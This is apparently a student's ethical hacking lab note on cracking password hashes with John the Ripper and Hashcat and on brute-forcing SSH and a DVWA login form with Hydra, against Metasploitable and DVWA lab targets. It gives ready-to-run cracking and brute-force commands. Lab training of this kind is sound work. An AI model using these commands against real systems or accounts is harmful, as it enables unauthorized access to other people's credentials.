---
type: lab
subject: ehpt
tags: [cybersecurity, lab, ehpt, password-cracking, john, hashcat, hydra]
status: learning
created: 2026-07-02
---

# Lab: Password Cracking and Hydra Brute Force

> 🔬 **Lab Practical** — EHPT Practical 7 | Est. time: 4 hrs

---

## 🎯 Objective
Crack password hashes using John the Ripper and Hashcat; perform online brute force against DVWA login with Hydra.

## 📝 Procedure

### Step 1: Crack Hashes with John
```bash
# Create hash file (from Metasploitable hashdump or DVWA extraction)
# John auto-detects hash type
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Force specific format
john --format=raw-md5 --wordlist=rockyou.txt md5_hashes.txt
```

### Step 2: Crack with Hashcat (GPU-accelerated)
```bash
# MD5 (mode 0)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Show results
hashcat -m 0 hashes.txt --show
```

### Step 3: Hydra SSH Brute Force
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.x.target -t 4
```

### Step 4: Hydra HTTP Form Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.x.target http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

### Step 5: Compare Performance
| Tool | Hash Type | Time | Method |
|------|-----------|------|--------|
| John | MD5 | | CPU dictionary |
| Hashcat | MD5 | | GPU dictionary |
| Hydra SSH | Online | | Network brute force |
| Hydra HTTP | Online | | Network brute force |

## ✅ Expected Output
- [ ] John --show output with cracked passwords
- [ ] Hashcat session screenshot
- [ ] Hydra SSH success screenshot
- [ ] Hydra HTTP form success screenshot
- [ ] Time comparison table

## 💭 Observation Questions
1. Why does adding a salt to a password hash dramatically increase cracking time?
2. From a defender's perspective, what Splunk detection rule would alert on SSH brute force?

## 🔗 Related Notes
- [[John the Ripper & Hashcat|John & Hashcat]]
- [[Hydra]]
- [[Hash & Encryption Reference|Hash Reference]] ⚡
